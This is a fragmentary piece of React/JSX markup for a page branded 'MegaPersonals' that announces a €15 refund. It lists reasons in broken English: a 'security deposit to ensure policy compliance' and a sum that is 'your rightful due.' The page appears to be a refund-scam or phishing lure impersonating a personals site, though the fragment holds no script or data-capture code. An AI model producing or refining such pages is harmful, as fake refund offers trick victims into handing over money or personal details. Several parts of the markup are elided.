    ...
    <div className="min-h-screen w-full flex flex-col items-center bg-white text-black font-sans">
      ...
      <div className="w-full bg-pink-500 py-4 text-center">
        <h1 className="text-2xl font-bold text-white">
          ...
          <span className="text-cyan-100">Personals</span><br />
      ...
      <div className="flex flex-col items-center text-center p-6 max-w-2xl">
        ...
        <p className="text-lg font-medium mb-2">
          ...
          IF YOU ARE REFUND <span className="text-[#9b59b6] font-bold">€15 MegaPersonals</span>
        </p>
        ...
        <div className="w-full max-w-lg border rounded shadow-inner h-40 overflow-y-scroll text-left p-4 mb-6 text-sm">
          <ul className="list-disc pl-4 space-y-2">
            <li>A certain amount was taken as a security deposit to ensure policy compliance.</li>
            ...
            <li>This is our way of saying thank you and encouraging your good work.</li>
            <li>The amount is your rightful due and a token of appreciation.</li>
          </ul>
          <p className="mt-4">
